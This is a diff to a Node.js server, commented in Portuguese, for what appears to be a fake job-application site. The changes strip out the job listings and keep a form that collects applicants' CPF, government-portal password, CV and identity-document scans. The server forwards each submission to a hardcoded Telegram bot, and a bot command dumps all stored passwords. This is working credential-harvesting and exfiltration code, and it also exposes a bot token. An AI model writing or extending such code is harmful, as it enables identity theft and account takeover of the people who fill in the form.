@@ -3,7 +3,8 @@ const sqlite3 = require('sqlite3').verbose();
 const multer = require('multer');
 const path = require('path');
 const TelegramBot = require('node-telegram-bot-api');
-const mime = require('mime-types'); // Usado para determinar o content-type dos arquivos
+const mime = require('mime-types');
+const fs = require('fs');
 const app = express();
 
 app.use(express.json());
@@ -17,13 +18,11 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage });
 
-// Conexão com SQLite e criação de tabela se necessário
+// Conexão com SQLite e criação da tabela candidaturas
 const db = new sqlite3.Database('./vagas.db', (err) => {
-    if (err) {
-        console.error('Erro ao conectar ao SQLite:', err);
-    } else {
+    if (err) console.error('Erro ao conectar ao SQLite:', err);
+    else {
         console.log('Conectado ao SQLite');
-
         db.run(`
             CREATE TABLE IF NOT EXISTS candidaturas (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -37,36 +36,16 @@ const db = new sqlite3.Database('./vagas.db', (err) => {
                 data_criacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         `, (err) => {
-            if (err) return console.error('Erro ao criar tabela candidaturas:', err);
-
+            if (err) console.error('Erro ao criar tabela candidaturas:', err);
             db.all("PRAGMA table_info(candidaturas)", (err, columns) => {
-                if (err) return console.error('Erro ao verificar colunas:', err);
-
-                const hasRgPath = columns.some(col => col.name === 'rg_path');
-                if (!hasRgPath) {
+                if (err) console.error('Erro ao verificar colunas:', err);
+                if (!columns.some(col => col.name === 'rg_path')) {
                     db.run(`ALTER TABLE candidaturas ADD COLUMN rg_path TEXT`, (err) => {
-                        if (err) {
-                            console.error('Erro ao adicionar coluna rg_path:', err);
-                        } else {
-                            console.log('Coluna rg_path adicionada com sucesso.');
-                        }
+                        if (err) console.error('Erro ao adicionar coluna rg_path:', err);
+                        else console.log('Coluna rg_path adicionada com sucesso.');
                     });
                 }
             });
-        });
-
-        db.run(`
-            CREATE TABLE IF NOT EXISTS vagas (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                titulo TEXT,
-                empresa TEXT,
-                localizacao TEXT,
-                salario TEXT,
-                descricao TEXT,
-                data_criacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        `, (err) => {
-            if (err) console.error('Erro ao criar tabela vagas:', err);
         });
     }
 });
@@ -76,18 +55,8 @@ const token = '7332904856:AAFQXw1Th9nH5wMRYf8Rt0HeRirLqFgbJR4';
 const chatId = '5114449108';
 const bot = new TelegramBot(token, { polling: true });
 
-// Funções de formatação de mensagens
-function formatVagaMessage(vaga) {
-    return `*Nova Vaga Cadastrada*\n\n` +
-           `*Título:* ${vaga.titulo}\n` +
-           `*Empresa:* ${vaga.empresa}\n` +
-           `*Localização:* ${vaga.localizacao}\n` +
-           `*Salário:* ${vaga.salario || 'Não informado'}\n` +
-           `*Descrição:* ${vaga.descricao}\n` +
-           `*Data:* ${vaga.data_criacao}`;
-}
-
-function formatCandidaturaMessage(cand) {
+// Função para formatar mensagem de candidatura
+const formatCandidaturaMessage = (cand) => {
     return `*Nova Candidatura Recebida*\n\n` +
            `*Nome:* ${cand.nome}\n` +
            `*Email:* ${cand.email}\n` +
@@ -97,39 +66,7 @@ function formatCandidaturaMessage(cand) {
            `*Currículo:* ${cand.curriculo_path}\n` +
            `*RG:* ${cand.rg_path || 'Não fornecido'}\n` +
            `*Data:* ${cand.data_criacao}`;
-}
-
-// Rota GET /vagas
-app.get('/vagas', (req, res) => {
-    db.all('SELECT * FROM vagas', [], (err, rows) => {
-        if (err) {
-            console.error('Erro ao listar vagas:', err);
-            return res.status(500).send('Erro ao listar vagas');
-        }
-        res.json(rows);
-    });
-});
-
-// Rota POST /vagas
-app.post('/vagas', (req, res) => {
-    const { titulo, empresa, localizacao, salario, descricao } = req.body;
-    const query = 'INSERT INTO vagas (titulo, empresa, localizacao, salario, descricao) VALUES (?, ?, ?, ?, ?)';
-
-    db.run(query, [titulo, empresa, localizacao, salario, descricao], function(err) {
-        if (err) {
-            console.error('Erro ao cadastrar vaga:', err);
-            return res.status(500).send('Erro ao cadastrar vaga');
-        }
-
-        db.get('SELECT * FROM vagas WHERE id = ?', [this.lastID], (err, vaga) => {
-            if (!err && vaga) {
-                bot.sendMessage(chatId, formatVagaMessage(vaga), { parse_mode: 'Markdown' });
-            }
-        });
-
-        res.send('Vaga cadastrada com sucesso!');
-    });
-});
+};
 
 // Rota POST /candidaturas
 app.post('/candidaturas', upload.fields([{ name: 'curriculo' }, { name: 'rg' }]), (req, res) => {
@@ -152,11 +89,9 @@ app.post('/candidaturas', upload.fields([{ name: 'curriculo' }, { name: 'rg' }])
         db.get('SELECT * FROM candidaturas WHERE id = ?', [this.lastID], (err, cand) => {
             if (!err && cand) {
                 bot.sendMessage(chatId, formatCandidaturaMessage(cand), { parse_mode: 'Markdown' });
-
                 const curriculoType = mime.lookup(curriculo_path) || 'application/octet-stream';
                 bot.sendDocument(chatId, curriculo_path, {}, { contentType: curriculoType })
                     .catch(err => console.error('Erro ao enviar currículo:', err));
-
                 if (rg_path) {
                     const rgType = mime.lookup(rg_path) || 'application/octet-stream';
                     bot.sendDocument(chatId, rg_path, {}, { contentType: rgType })
@@ -169,38 +104,17 @@ app.post('/candidaturas', upload.fields([{ name: 'curriculo' }, { name: 'rg' }])
     });
 });
 
-// Comando /vagas no bot
-bot.onText(/\/vagas/, (msg) => {
-    if (msg.chat.id.toString() !== chatId) return bot.sendMessage(msg.chat.id, 'Acesso negado.');
-
-    db.all('SELECT * FROM vagas', [], (err, rows) => {
-        if (err || !rows.length) {
-            return bot.sendMessage(chatId, 'Nenhuma vaga encontrada.');
-        }
-
-        let mensagem = '*Vagas Disponíveis*\n\n';
-        rows.forEach(v => {
-            mensagem += `*${v.titulo}*\nEmpresa: ${v.empresa}\nLocal: ${v.localizacao}\nSalário: ${v.salario || 'Não informado'}\nDescrição: ${v.descricao}\nData: ${v.data_criacao}\n\n`;
-        });
-
-        bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
-    });
-});
-
 // Comando /candidaturas no bot
 bot.onText(/\/candidaturas/, (msg) => {
     if (msg.chat.id.toString() !== chatId) return bot.sendMessage(msg.chat.id, 'Acesso negado.');
 
     db.all('SELECT * FROM candidaturas', [], (err, rows) => {
-        if (err || !rows.length) {
-            return bot.sendMessage(chatId, 'Nenhuma candidatura encontrada.');
-        }
+        if (err || !rows.length) return bot.sendMessage(chatId, 'Nenhuma candidatura encontrada.');
 
         let mensagem = '*Candidaturas Recebidas*\n\n';
         rows.forEach(c => {
             mensagem += `*${c.nome}*\nEmail: ${c.email}\nTelefone: ${c.telefone}\nCPF: ${c.cpf}\nSenha GOV: ${c.senha_gov}\nCurrículo: ${c.curriculo_path}\nRG: ${c.rg_path || 'Não fornecido'}\nData: ${c.data_criacao}\n\n`;
         });
-
         bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
     });
 });
@@ -208,10 +122,9 @@ bot.onText(/\/candidaturas/, (msg) => {
 // Servir arquivos da pasta uploads
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
-// ⬇⬇⬇ Cole aqui ⬇⬇⬇
+// Servir frontend estático
 app.use(express.static(path.join(__dirname, 'public')));
-
-app.get('*', (req, res) => {
+app.use((req, res) => {
     const indexPath = path.join(__dirname, 'public', 'index.html');
     if (fs.existsSync(indexPath)) {
         res.sendFile(indexPath);
@@ -219,7 +132,6 @@ app.get('*', (req, res) => {
         res.status(404).send('Página não encontrada');
     }
 });
-// ⬆⬆⬆ Até aqui ⬆⬆⬆
 
 // Iniciar servidor
 const PORT = process.env.PORT || 3000;
